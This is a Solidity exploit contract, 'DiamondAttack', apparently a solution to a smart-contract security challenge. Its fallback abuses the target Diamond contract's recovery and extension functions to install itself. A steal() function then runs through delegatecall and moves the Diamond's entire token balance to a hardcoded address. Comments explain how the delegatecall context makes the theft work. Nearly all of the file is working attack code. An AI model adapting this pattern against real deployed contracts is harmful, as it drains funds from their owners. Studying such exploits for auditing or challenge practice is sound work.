// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "../contracts/Diamond.sol";

contract DiamondAttack {
    Diamond diamond;

    constructor(address _diamond) {
        diamond = Diamond(_diamond);
    }

    fallback() external payable {
        diamond.recovery(address(this));
        diamond.setExtension(address(this));
        diamond.callExtension(abi.encodeWithSignature("steal()"));
    }

    // no need to define these functions because the fact that they are called through a delegatecall will make them execute the functions of the Diamond contract instead
    function transfer(address to, uint256 amount) public returns (bool) {}
    function balanceOf(address account) public returns (uint256) {}

    function steal() public {
        // because this function will be called through a delegate call, the value of address(this) will be the address of the Diamond contract and not of our Attack contract
        bool success = this.transfer(0x8112593a39Ca3a18223805e19CcFc1937f2E25c0, this.balanceOf(address(this)));
        require(success);
    }
}